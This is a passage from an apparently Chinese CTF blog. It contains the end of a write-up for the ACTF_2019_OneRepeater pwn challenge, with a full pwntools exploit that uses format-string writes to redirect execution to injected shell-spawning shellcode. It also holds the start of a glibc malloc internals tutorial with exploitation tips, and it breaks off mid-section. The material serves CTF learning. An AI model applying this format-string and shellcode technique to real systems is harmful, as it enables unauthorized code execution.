p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么最后指令就会跳转到<code>buf</code>上，在选择3之前在<code>buf</code>上填一遍<code>shellcode</code>就完事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/4.png" alt="4"></p><p>可以看到通过两次跳转，程序成功执行到了<code>shellcode</code>，然后就愉快的<code>cat flag</code> 吧</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./ACTF_2019_OneRepeater&#x27;</span>,port=<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Exit&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>malloc源码分析</title>
      <link href="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>学了这么久堆漏洞了，我想应该把<code>glibc</code>的<code>malloc</code>和<code>free</code>源码解析写一下了，希望能帮助一下刚上路的师傅，同时也巩固一下自身知识。</p><span id="more"></span><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>我们平时写程序的时候，某些变量可能需要在开始就分配内存，这些内存是不可避免的。那么这些内存就是静态分配的，当程序编译完成之后，它就确定了占用这么多的内存。但是有时候，实际问题的规模没有预期那么大，我们不一定需要很大的内存，如果每次都按最大考虑那么就有很大一部分内存是被浪费的，这就是静态分配内存的弊端，虽然咱打acm的时候都是静态分配的，但是这没啥，因为每个问题不要超过它的总内存上限问题就不大(狗头。但是在内存不足的年代，如果都这样使用静态分配内存的方式，那么计算机的效率会被拖垮很多，所以就有动态分配内存的概念了。</p><p><code>glibc</code>采用<code>ptmalloc</code>的管理方式去分配内存。</p><h2 id="ptmalloc2的分配策略"><a href="#ptmalloc2的分配策略" class="headerlink" title="ptmalloc2的分配策略"></a>ptmalloc2的分配策略</h2><p>那么动态分配内存要怎么去分配呢？如果我们需要占用除了我程序本身占用的内存以外的一块内存，那程序指定是没权限用的，得先向操作系统申请这一块内存的使用权。而操作系统没那么闲，分配几个字节的内存都要它去管，操作系统管理都是按页式的管理。而一页的内存是<code>0x1000B</code>，如果每一次申请我都向操作系统申请，每一次归还都直接归还给操作系统那么必定会增大操作系统的负担。因此分配内存的时候可以按照一个策略去分配，分配一定得尽量避免过多地使用系统调用，归还的时候可以等到程序结束时一并归还，这样的话操作系统的负担就大大下降了。</p><p><code>ptmalloc2</code>的分配方式会在你第一次<code>malloc</code>的时候向操作系统申请<code>0x21000B(132KB)</code>的内存，然后后续分配就不会向操作系统申请内存，只有用完了的时候才会再次申请内存。</p><p>操作系统的问题解决了之后我们再来看看<code>glibc</code>怎么处理具体的分配细节。分配的时候我一定是切出一块特定大小才是最优的策略的，比如程序<code>malloc(4)</code>，那我接切个4字节的内存给它用，<code>malloc(1)</code>那就给它一字节去使用。然而现实没有那么理想，因为如果我切下来的块用户程序完全可写的话，那么我怎么区分这个内存块是否被使用呢？然后内存块的分界线又如何界定呢？所以分割内存块的时候不可避免地要在内存块中额外开出一部分区域用于管理。那么可以在每个分配的内存块加上一个<code>int</code>数据作为此内存块的<code>size</code>，64位的操作系统可以使用<code>long long</code>。同理，为了管理方便，<code>glibc</code>在分配<code>chunk</code>的时候也并不是分配这么多就只能写这么多的。它也不想闲到去管1字节2字节这样的内存块。而且如果有这样的内存块，那么在分配指针的时候内存没办法对齐会出现很多麻烦的事。所以在分配内存块的时候，有一个<code>SIZE_SZ</code>，一次分配的内存必定是<code>SIZE_SZ*2</code>的整倍数，<code>SIZE_SZ</code>在32位操作系统下的值是<code>4</code>，64位的值是<code>8</code>。为了方便，以下把内存块统一叫<code>chunk</code>。</p><p>以32位操作系统为例，size的值必定为8的整数倍，二进制角度下看来，低三位永远是0，这样有点浪费了内存，因此规定<code>size</code>的低三位不作为实际的<code>chunk</code>大小，而是标志位。三个标志位从高位到低位分别是：</p><ol><li><code>NON_MAIN_ARENA</code>:是否为主分配，0表示是主分配，权值为4</li><li><code>IS_MMAPPED</code>:表示内存是否为<code>mmap</code>获得，0表示不是，权值为2</li><li><code>PREV_INUSE</code>:表示前面一个内存块是否被使用，0表示不被使用，权值为1</li></ol><p>在64位操作系统中，多出一个标志位，但是这个标志位无任何意义，可能后续会赋予别的意义，但是它一样不影响<code>chunk</code>的大小。</p><p>在看malloc源码的时候可以看到一个宏定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>那么就可以看到<code>chunksize</code>在取实际<code>size</code>的时候与了一个<code>0xfffffff8</code>，忽略了最低三位，64位操作系统则会忽略最低四位。</p><p>以下例子为64位操作系统</p><p><code>chunk</code>最小的大小为<code>0x20</code>，为什么没有<code>0x10</code>大小的<code>chunk</code>呢，这么看来<code>size</code>占了<code>8</code>字节还能有8字节给用户去写似乎没问题。大不了我超过<code>8B</code>再分配<code>0x20</code>大小的内存嘛，这个疑问先放一下，我们来看看这样的策略它还有没有什么问题。</p><p>如果一个<code>chunk</code>被确定释放了，那么该以什么方式去管理。你会想到前面有一个<code>prev_inuse</code>位可以确定一个堆块是否被释放，你会想到改下一个<code>chunk</code>的标志位就可以了，但是如果这个内存块再次被需要呢，难道去遍历每一个<code>chunk</code>，一来要看<code>size</code>符不符合，二来还要看它有没有被使用，这样时间开销太大了。因为空闲的<code>chunk</code>可能散落在内存各个角落，管理零碎内存最好的办法就是链表。链表还得有表头，这个表头其实就是我们的<code>main_arena</code>中的<code>bin</code>。因此<code>chunk</code>上还得有一块内存是指针，指针又占了<code>8</code>个字节。</p><p>但是你可能想到，指针它只在块被释放的时候有用啊，<code>0x10</code>的块，一个<code>size</code>，一个指针，被分配的时候用指针作为数据域，被释放的时候指针用于链式管理。这样就解决了，这样也的确没问题。但是看看它这样的分配策略还有没有问题？如果我多次分配<code>chunk</code>很小的块，<code>free</code>之后它们便只能用于分配这么大的内存了。如果不加另一种策略组织起来，导致内存碎片越来越多，就容易耗尽系统内存。</p><p>那么就有<code>ptmalloc</code>的又一个策略：尽量合并物理相邻的<code>free_chunk</code>。咱们前面一直提到切割内存块，合并内存块就是切割的一个逆过程。在合并的时候我可能前面会有<code>free</code>的内存块，后面也会有<code>free</code>的内存块。那么我怎么在只知道我自身信息的情况下准确找到前后的<code>chunk</code>具体在哪呢。</p><p>想找到后面的很容易，我知道我自己所在的位置（指针），也知道我的<code>size</code>，那么相加就可以找到后面的<code>size</code>了。那么我如何找前面的<code>size</code>在什么位置呢？所以就不得不再开辟一个内存来存前一个<code>chunk</code>的信息了。通过<code>prev_inuse</code>位我很容易得知前一个<code>chunk</code>有没有被<code>free</code>，但是我并不知道前一个<code>chunk</code>的大小啊。所以在一个<code>chunk</code>的结构体，在size之前还会有一个<code>prev_size</code>。与前面那个指针同理，我只有在前一个块被<code>free</code>需要合并的时候才会想看看它在哪，他要是都还在用我都没必要去使用这个<code>prev_size</code>字段了。但是要注意，这个<code>prev_size</code>是服务于上一个<code>chunk</code>的。所以一个chunk的结构体就有<code>0x10</code>个不得不分配的字节，而且自己还不能用。因此<code>0x10</code>的<code>chunk</code>就没有意义了。所以源码中也会找到这样的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE 4*SIZE_SZ</span></span><br></pre></td></tr></table></figure><p>说了这么多了，<code>ptmalloc</code>的策略大致总结一下就是：</p><ol><li><p>一次系统调用会分配大块内存</p></li><li><p>程序结束后统一归还内存给操作系统</p></li><li><p>方便管理，内存分配尽量对齐，也就是所谓的size为某某整倍数</p></li><li><p>尽量分配最小能满足的内存块</p></li><li><p>链式管理空闲空间，适当的时候合并物理相邻的<code>chunk</code></p></li></ol><p>而且根据以上分析我们可以得出一些关于<code>chunk</code>的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_size;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    chunk *fd;</span><br><span class="line">    chunk *bk;<span class="comment">//因为链式管理还有可能是双向链表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们大致就明白了<code>ptmalloc</code>的分配方式。</p><h2 id="ptmalloc2的具体分配策略"><a href="#ptmalloc2的具体分配策略" class="headerlink" title="ptmalloc2的具体分配策略"></a>ptmalloc2的具体分配策略</h2><p>前面我们讲到了，对于空闲块使用了链式管理方式。但是对于不同大小的<code>chunk</code>，它又有细分。这里先给一个概念：<code>bin</code>，字面意义垃圾桶，用于装<code>free_chunk</code>的垃圾桶，在这里可以理解为链表表头。</p><p>以下均以<code>glibc 2.23</code>版本解析</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>对于<code>size</code>较小的<code>free_chunk</code>，我们认为它很快就会被再次用到，因此在<code>free</code> <code>0x20~0x80</code>大小的<code>chunk</code>时，我们会把它扔进<code>fast bin</code>里面，字面意义，里面存的<code>free_chunk</code>很快会被再次用到。<code>fast bin</code> 管理<code>free_chunk</code>采用单链表方式，并且符合后进先出（<code>FILO</code>）的原则，比如以下程序段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">y=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"><span class="built_in">free</span>(y);</span><br><span class="line">z=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">w=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>那么z会得到y的指针，w会得到x的指针。</p><p>并且<code>fast bin</code>的<code>chunk</code>的之后的<code>chunk</code> <code>prev_inuse</code>位永远为1。也就是说它永远被视为在使用中，但是通常这个使用中是用于检测参不参与物理相邻<code>chunk</code>的合并，所以不会参与物理相邻的<code>chunk</code>的合并，也不会被切割。它的匹配规则就是，定量匹配。比如我想要一个<code>0x30</code>的<code>chunk</code>，没有就是没有，没有我就找其它的，不会说<code>0x40</code>好像还挺合适就拿了，不会。</p><p><code>fast bin</code>一共有<code>10</code>个，<code>main_arena</code>结构体中，用<code>fastbinsY</code>来存储每一个<code>fast bin</code>的链表头部，32位系统中，<code>fast bin</code>，从0x10开始到<code>0x40</code>，有7种<code>fast bin</code>，64位系统从<code>0x20</code>开始到<code>0x80</code>，也是七种<code>fast bin</code>。单个<code>fast bin</code>链表上的<code>chunk</code>大小一定严格相等。</p><p>一定情况下可以修改<code>global_max_fast</code>的值来调整<code>fast bin</code>的个数，64位系统下这个值通常为<code>0x80</code>，代表小于等于<code>0x80</code>的<code>chunk</code>都为<code>fast bin</code>。</p><p>其余的链表头部都在<code>bin</code>数组当中。并且由于只有<code>fast bin</code>是单链表结构，其余<code>bin</code>都是双向链表结构，<code>bin</code>会成对出现。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>对于非<code>fast bin</code>大小的<code>chunk</code>，被释放时会首先进入<code>unsorted bin</code>。<code>unsorted bin</code>在特定的时候会进入<code>small bin</code> 和 <code>large bin</code>。</p><p>非<code>fast bin</code>的<code>bin</code>都是用一对<code>bin</code>指针来描述的，这两个<code>bins</code>也要看成一个<code>chunk</code>，然后初始它们的<code>fd</code>和<code>bk</code>都指向自身的<code>prev_size</code>那个位置。比如<code>main_arena+104</code>这个地方是<code>bin</code>数组的第一个，然后呢<code>main_arena+104</code>和<code>main_arena+112</code>分别就是<code>unsorted bin</code>的头部，它们本身虽然不是<code>chunk</code>，但是要理解它们的初始状态还是得看成一个<code>chunk</code>。所以<code>main_arena+104</code>和<code>main_arena+112</code>的初始值就是<code>main_arena+88</code>。如图：</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>设置这一个<code>bin</code>的主要目的是扮演一个缓存层的角色以加快分配和释放的操作，链表中<code>chunk</code>大小不一定相等且无序排列。</p><p>当需要检查<code>unsorted bin</code>的时候，会遍历整个链表，寻找第一个能满足的<code>chunk</code>大小切割。如果切割后的大小不足<code>2*SIZE_SZ</code>，则不会切割，而是将整个堆块返回给用户使用。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>一共有<code>62</code>个，从最小的<code>chunk</code>开始，公差为<code>SIZE_SZ*2</code>，双链表管理。它的特点也是跟fast bin一样，单条链表<code>chunk</code>大小相等，但是它会参与合并，切割。先进先出（<code>FIFO</code>）的策略。它表示的范围就是<code>4*SIZE_SZ~126*SIZE_SZ</code></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><code>large bin</code>与<code>small bin</code>不一样，<code>large bin</code>表示的是一个范围。一共有<code>63</code>个(假设下标<code>0~62</code>)，从<code>small bin</code>最小不能表示的<code>chunk</code>开始，大到无穷。</p><p>它表示的范围类似一个等差数列。</p><table><thead><tr><th>起下标</th><th>止下标</th><th>公差</th></tr></thead><tbody><tr><td>0</td><td>31</td><td>16*SIZE_SZ</td></tr><tr><td>32</td><td>47</td><td>32*SIZE_SZ</td></tr><tr><td>48</td><td>55</td><td>64*SIZE_SZ</td></tr><tr><td>56</td><td>59</td><td>128*SIZE_SZ</td></tr><tr><td>60</td><td>61</td><td>256*SIZE_SZ</td></tr><tr><td>62</td><td>62</td><td>∞</td></tr></tbody></table><p>最小的<code>large bin</code>是<code>small bin</code>的最小不能表示的大小。</p><p>所以<code>large bin</code>从<code>128*SIZE_SZ</code>开始。那么下标为<code>0</code>的<code>large bin</code>表示的范围就是<code>128*SIZE_SZ~144*SIZE_SZ</code>(左闭右开)，同理下标为1的<code>large bin</code>表示的范围就是<code>144*SIZE_SZ~160*SIZE_SZ</code>，以此类推，等到<code>32</code>的时候就在原来的基础上加<code>32*SIZE_SZ</code>作为右开区间</p><p>它会以二维双向链表进行维护，对于<code>bin</code>中所有的<code>chunk</code>，相同大小的<code>chunk</code>用<code>fd</code>和<code>bk</code>指针相连，对于不同大小的<code>chunk</code>，采用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针连接。并且沿着<code>fd_nextsize</code>指针，<code>chunk</code>大小递增。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top_chunk"></a>top_chunk</h3><p>我们之前说过，第一次<code>malloc</code>的时候，操作系统会给我们<code>0x21000B</code>的内存，它是作为一个<code>top_chunk</code>存在的，可以把<code>top_chunk</code>看成<code>heap</code>的边界。<code>top_chunk</code>的地址会被记录在main_arena+88的位置。<code>gdb</code>中通过<code>p/x main_arena</code>的命令也可以查看<code>main_arena</code> 的具体结构。</p><h3 id="分配流程"><a href="#分配流程" class="headerlink" title="分配流程"></a>分配流程</h3><p>首先用户<code>malloc</code>请求一个内存，先将请求的内存大小转换成<code>chunk</code>的大小，通过以下宏定义转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>大概逻辑就是寻找一个最小能满足的<code>chunksize</code>作为<code>chunk</code>大小。</p><p>什么是最小能满足呢，我们看看一个<code>size=0x20</code>的<code>chunk</code>能有多少区域给用户写：<code>0x20</code>字节分别为<code>prev_size</code>，<code>size</code>，<code>fd</code>和<code>bk</code>，<code>prev_size</code>和<code>size</code>都不允许写，但是我们可以写<code>fd</code>和<code>bk</code>，以及下一个块的<code>prev_size</code>，前面我们也说过，当这个块没有被<code>free</code>的时候，它的<code>fd</code>,<code>bk</code>以及下一个<code>chunk</code>的<code>prevsize</code>位都是可以给用户任意写数据的，所以<code>size=0x20</code>，我们可以写的数据段为<code>0x18</code>。最小能满足就是说，当我请求的内存小于等于<code>0x18</code>的时候，我给你<code>size=0x20</code>的<code>chunk</code>，一旦多了就继续加<code>0x10</code>，也就是<code>2*SIZE_SZ</code>。这里用了其它宏定义去描述它我们尚且不管，如果用一个函数来实现它的话大概就是这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">request2size</span><span class="params">(<span class="keyword">size_t</span> req)</span></span>&#123;</span><br><span class="line">    chunk_size=SIZE_SZ*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span>(chunk_size&lt;req)chunk_size+=<span class="number">2</span>*SIZE_SZ;</span><br><span class="line">    <span class="keyword">return</span> chunk_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在分配的时候我们尽量选择<code>0x18</code>,<code>0x28</code>这样刚刚好的数值，这样更容易发生溢出，哪怕溢出一个字节，也能够加以利用。</p><p>那么算出了它的<code>chunk_size</code>之后呢，我们先会判断这个<code>chunk_size</code>是否<code>&lt;=global_max_fast</code>，也就是是否在<code>fast bin</code>范围内。如果在则优先寻找能匹配的<code>fast bin</code>，如果该<code>size</code>的<code>fast bin</code>为空则会寻找<code>small bin</code>，<code>small bin</code>会寻找特定<code>size</code>的<code>chunk</code>返回。如果<code>small bin</code>也为空，或者找不到能满足的那就会去<code>large bin</code>中寻找，同样是最小能满足，找到之后返回或者切割之后返回。还找不到就会去<code>unsorted bin</code>，<code>unsorted bin</code>则会找第一个能满足的<code>chunk</code>并返回或者切割之后返回，<code>unsorted bin</code> 中每遍历一个不满足要求的<code>unsorted bin</code>就会把该<code>unsorted bin</code>加到合适的small bin或者<code>large bin</code>当中。如果切割之后剩余的部分&lt;<code>MINSIZE</code>，那么则不会切割整个返回。</p><p>如果还是找不到，那么就会切割<code>top_chunk</code>。如果<code>top_chunk</code>都不能满足请求的大小，则会<code>free</code> <code>top_chunk</code>并再一次向操作系统申请新的<code>top_chunk</code>，这次申请同样还是申请一个<code>0x21000B</code>的<code>top_chunk</code>，通常情况下旧的<code>top_chunk</code>和新申请的<code>top_chunk</code>物理相邻，那么如果<code>free</code> 旧的<code>top_chunk</code>进入了一个非<code>fast bin</code>的链当中，就会被新的<code>top_chunk</code>合并。</p><p>如果一次申请的内存超过<code>0x200000B</code>，那么就不会在heap段上分配内存，将会使用<code>mmap</code>在<code>libc</code>的<code>data</code>段分配内存。通常利用就是每次分配给分配地址，分配<code>size</code>没限制那就<code>malloc</code>一个很大的内存就可以直接泄露<code>libc</code>的地址。</p><p>分配方式到此就讲完了。</p><h2 id="malloc源码分析"><a href="#malloc源码分析" class="headerlink" title="malloc源码分析"></a>malloc源码分析</h2><p>接下来我们直接解读一下<code>malloc</code>的源码。</p><h3 id="libc-malloc源码分析"><a href="#libc-malloc源码分析" class="headerlink" title="__libc_malloc源码分析"></a>__libc_malloc源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc实际上会直接调用这里的<code>__libc_malloc</code>函数，然后<code>__libc_malloc</code>也只不过是一层包装而已，实际上大部分的逻辑都是调用<code>_int_malloc</code>函数完成的，那么先来分析外面。</p><p>第一段</p><figure 